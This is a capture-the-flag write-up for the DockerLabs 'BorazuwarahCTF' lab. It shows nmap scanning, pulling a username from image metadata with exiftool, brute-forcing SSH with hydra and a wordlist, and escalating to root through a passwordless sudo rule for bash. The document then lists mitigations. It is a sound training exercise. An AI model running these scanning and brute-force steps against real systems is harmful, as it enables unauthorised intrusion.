
# 🐳 DockerLabs - BorazuwarahCTF


# 📌 General information

| Machine        | Difficulty | Author      | Target IP  | Category      |
| -------------- | ---------- | ----------- | ---------- | ------------- |
| BorazuwarahCTF | Very easy  | borazuwarah | 172.17.0.2 | steganography |

![[BorazuwarahCTF.png]]


# 🎯 Objective

Identify exposed services, detect vulnerabilities, and gain access to the target system.


# 🛠️ Tools

- ***ping***: Connectivity and range check
- ***nmap***: Port and services scanning and recognition
- ***curl***: http requests
- ***wget***: File downloading
- ***exiftool***: File metadata reading
- ***hydra***: For ssh brute force attack


# 🔌 Ports


| Port | Service |
| ---- | ------- |
| 22   | ssh     |
| 80   | http    |


# 📡 Connectivity with ***ping***

```bash
ping -c4 172.17.0.2
```

![[borazuwarahctf/img_1.png]]


# 🩻 Scanning with ***nmap***

```bash
nmap -sn 172.17.0.0/16
```

![[borazuwarahctf/img_2.png]]

```bash
nmap -p- -Pn -sS -sV -sC -O -T4 --open 172.17.0.2
```

![[borazuwarahctf/img_3.png]]


# 🌐 Sending request to http server

```bash
curl -i http://172.17.0.2
```

![[borazuwarahctf/img_4.png]]


# 📥 Downloading file using ***wget***

```bash
wget http://172.17.0.2:80/imagen.jpeg
```

![[borazuwarahctf/img_5.png]]


# 🧬 Looking inside file's metadata

```bash
exiftool imagen.jpeg
```

![[borazuwarahctf/img_6.png]]

Inside the file's metadata is a posible user of the target machine ***borazuwarah***


# 💣 ssh brute force attack

```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt -t 4 -v ssh://172.17.0.2
```

![[borazuwarahctf/img_7.png]]

Credentials found:

| User        | Password |
| ----------- | -------- |
| borazuwarah | 123456   |


# 🔗 Connecting using found credentials

```bash
ssh borazuwarah@172.17.0.2
```

![[borazuwarahctf/img_8.png]]

At this point, we do not have root access to target machine


# 📈 Increasing access

Let's check access and permissions to find a way to obtain root permissions

![[borazuwarahctf/img_9.png]]

Any user is able to execute `/bin/bash` without password

![[borazuwarahctf/img_10.png]]

***Root access obtained!***


# 🔑 Key points

- User hint in metadata
- Vulnerable SSH password
- Low control over users permissions and control access


# ☠️ Impact

- Full system compromise
- Root level access obtained
- Personal information exposed


# 🔐 Mitigation

- Use a stronger password
- Be careful about the saved information in files metadata
- Have an strict control for users and permissions


# 📜 Conclusion

Target machine exploited successfully

1. Identify open ports
2. Exploring and scanning webpages for different ways to penetrate and information
3. File from webpage downloaded and scanned for sensitive data in file's metadata
4. Sensitive information found in file's metadata
5. Valid credentials detection using brute force attack
6. Scaling access through users
7. Found sensitive information